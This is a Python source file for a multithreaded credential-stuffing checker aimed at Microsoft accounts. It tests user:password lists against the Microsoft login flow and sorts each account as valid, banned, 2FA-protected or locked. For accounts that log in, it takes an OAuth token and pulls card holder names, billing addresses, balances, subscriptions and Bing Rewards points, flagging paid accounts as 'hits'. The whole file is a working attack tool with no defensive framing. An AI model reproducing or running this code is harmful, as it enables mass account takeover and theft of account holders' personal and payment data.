import re
import requests
from urllib.parse import unquote, quote
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

def parse_lr(text, left, right):
    m = re.search(f'{re.escape(left)}(.*?){re.escape(right)}', text, re.DOTALL)
    return m.group(1) if m else ""

def check_status(text, url, cookies):
    if any(x in text for x in [
        "Your account or password is incorrect.",
        "That Microsoft account doesn\\'t exist.",
        "Sign in to your Microsoft account",
        "timed out"
    ]):
        return "FAILURE"
    if ",AC:null,urlFedConvertRename" in text:
        return "BAN"
    if any(x in text for x in [
        "account.live.com/recover?mkt", "recover?mkt",
        "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt"
    ]):
        return "2FACTOR"
    if "/cancel?mkt=" in text or "/Abuse?mkt=" in text:
        return "CUSTOM_LOCK"
    if ("ANON" in cookies or "WLSSC" in cookies) and "https://login.live.com/oauth20_desktop.srf?" in url:
        return "SUCCESS"
    return "UNKNOWN_FAILURE"

# Initial authorize URL to GET fresh login page
AUTHORIZE_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=0000000048170EF2"
    "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
    "&response_type=token"
    "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
    "&display=touch"
)

COMMON_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate",
}


def check_account(credential):
    try:
        user, password = credential.split(":", 1)
    except ValueError:
        return {"status": "fail", "user": credential, "password": "", "detail": "Bad format"}

    s = requests.Session()
    s.headers.update(COMMON_HEADERS)

    try:
        # ── Step 1: GET the login page to extract fresh PPFT + urlPost ──
        r0 = s.get(AUTHORIZE_URL, allow_redirects=True, timeout=15)
        page = r0.text

        ppft = parse_lr(page, 'name="PPFT" id="i0327" value="', '"')
        if not ppft:
            ppft = parse_lr(page, "sFT:'", "'")
        if not ppft:
            return {"status": "fail", "user": user, "password": password, "detail": "PPFT not found"}

        url_post = parse_lr(page, "urlPost:'", "'")
        if not url_post:
            url_post = parse_lr(page, 'urlPost:"', '"')
        if not url_post:
            return {"status": "fail", "user": user, "password": password, "detail": "urlPost not found"}

        # ── Step 2: POST login with fresh values ──
        data = (
            f"ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid="
            f"&PPFT={quote(ppft)}"
            f"&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1"
            f"&isSignupPost=0&isRecoveryAttemptPost=0&i13=1"
            f"&login={quote(user)}&loginfmt={quote(user)}&type=11&LoginOptions=1"
            f"&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={quote(password)}"
        )

        post_headers = {
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": r0.url,
            "Upgrade-Insecure-Requests": "1",
        }

        r1 = s.post(url_post, headers=post_headers, data=data, allow_redirects=True, timeout=15)
        status = check_status(r1.text, r1.url, s.cookies.get_dict())

        if status != "SUCCESS":
            labels = {
                "FAILURE": ("fail", "Invalid Credentials"),
                "UNKNOWN_FAILURE": ("fail", "Unknown Failure"),
                "BAN": ("locked", "Banned"),
                "2FACTOR": ("locked", "2FA/Verify"),
                "CUSTOM_LOCK": ("locked", "Custom Lock"),
            }
            s2, d = labels.get(status, ("fail", status))
            return {"status": s2, "user": user, "password": password, "detail": d}

        # ── Step 3: OAuth token ──
        oauth_url = (
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=000000000004773A"
            "&response_type=token"
            "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
            "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
            "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D"
            "&prompt=none"
        )
        r2 = s.get(oauth_url, headers={
            "Host": "login.live.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5", "Connection": "close",
            "Referer": "https://account.microsoft.com/",
        }, allow_redirects=True, timeout=15)

        token = parse_lr(r2.url, "access_token=", "&token_type")
        if not token:
            return {"status": "locked", "user": user, "password": password, "detail": "Token Parse Fail"}
        token = unquote(token)

        # ── Step 4: Payment info ──
        pay_h = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
            "Pragma": "no-cache", "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": f'MSADELEGATE1.0="{token}"',
            "Content-Type": "application/json",
            "Origin": "https://account.microsoft.com",
            "Referer": "https://account.microsoft.com/",
            "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site",
        }

        r3 = s.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US", headers=pay_h, timeout=15)
        src3 = r3.text

        balance = parse_lr(src3, 'balance":', ',"') or "N/A"
        card_holder = parse_lr(src3, 'paymentMethodFamily":"credit_card","display":{"name":"', '"') or "N/A"
        account_holder = parse_lr(src3, 'accountHolderName":"', '","') or "N/A"
        zipcode = parse_lr(src3, '"postal_code":"', '",') or "N/A"
        region = parse_lr(src3, '"region":"', '",') or "N/A"
        address1 = parse_lr(src3, '{"address_line1":"', '",') or "N/A"
        city = parse_lr(src3, '"city":"', '",') or "N/A"

        # ── Step 5: Subscription ──
        r5 = s.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=pay_h, timeout=15)
        src5 = r5.text

        country = parse_lr(src5, 'country":"', '"}') or "N/A"
        subscription = parse_lr(src5, 'title":"', '",') or "N/A"
        ctpid = parse_lr(src5, '"subscriptionId":"ctp:', '"') or "N/A"
        item1 = parse_lr(src5, '"title":"', '"') or "N/A"
        auto_renew = "N/A"
        if ctpid != "N/A":
            auto_renew = parse_lr(src5, f'{{"subscriptionId":"ctp:{ctpid}","autoRenew":', ',') or "N/A"
        start_date = parse_lr(src5, '"startDate":"', 'T') or "N/A"
        next_renewal = parse_lr(src5, '"nextRenewalDate":"', 'T') or "N/A"
        desc_sub2 = parse_lr(src5, '"description":"', '"') or "N/A"
        qty_sub2 = parse_lr(src5, '"quantity":', ',') or "N/A"
        currency = parse_lr(src5, '"currency":"', '"') or ""
        total_amt = parse_lr(src5, '"totalAmount":', ',') or "N/A"

        # ── Step 6: Bing points ──
        points = "0"
        try:
            r4 = s.get("https://rewards.bing.com/", headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                "Pragma": "no-cache", "Accept": "*/*",
            }, timeout=15)
            points = parse_lr(r4.text, ',"availablePoints":', ',"') or "0"
        except Exception:
            pass

        captures = {
            "Address": f"[ Address: {address1}, City: {city}, State: {region}, Postalcode: {zipcode} ]",
            "Points": points,
            "CC-Cap": f"[Country: {country} | CardHolder: {account_holder} | CC: {card_holder} | CC Funding: ${balance} ]",
            "Subscription-1": f"[ Purchased Item: {item1} | Auto Renew: {auto_renew} | startDate: {start_date} | Next Billing: {next_renewal} ]",
            "Subscription-2": f"[ Product: {desc_sub2} | Total Purchase: {qty_sub2} | Avaliable Points: {points} | Total Price: {total_amt}{currency} ]",
        }

        active = False
        if subscription and subscription != "N/A" and next_renewal and next_renewal != "N/A":
            try:
                if datetime.strptime(next_renewal, "%Y-%m-%d").date() >= datetime.now().date():
                    active = True
            except ValueError:
                pass

        return {
            "status": "hit" if active else "free",
            "user": user, "password": password,
            "captures": captures,
        }

    except requests.exceptions.RequestException:
        return {"status": "retry", "user": user, "password": password, "detail": "Connection Error"}
    except Exception as ex:
        return {"status": "fail", "user": user, "password": password, "detail": str(ex)}


def check_accounts(credentials, threads=15, on_progress=None, stop_event=None):
    results = []
    done = 0

    def worker(cred):
        nonlocal done
        if stop_event and stop_event.is_set():
            return None
        r = check_account(cred)
        done += 1
        if on_progress:
            on_progress(done, len(credentials))
        return r

    with ThreadPoolExecutor(max_workers=min(threads, len(credentials))) as pool:
        futs = {pool.submit(worker, c): i for i, c in enumerate(credentials)}
        ordered = [None] * len(credentials)
        for fut in as_completed(futs):
            idx = futs[fut]
            try:
                ordered[idx] = fut.result()
            except Exception:
                ordered[idx] = {"status": "fail", "user": credentials[idx], "password": "", "detail": "Thread error"}

    return [r for r in ordered if r]
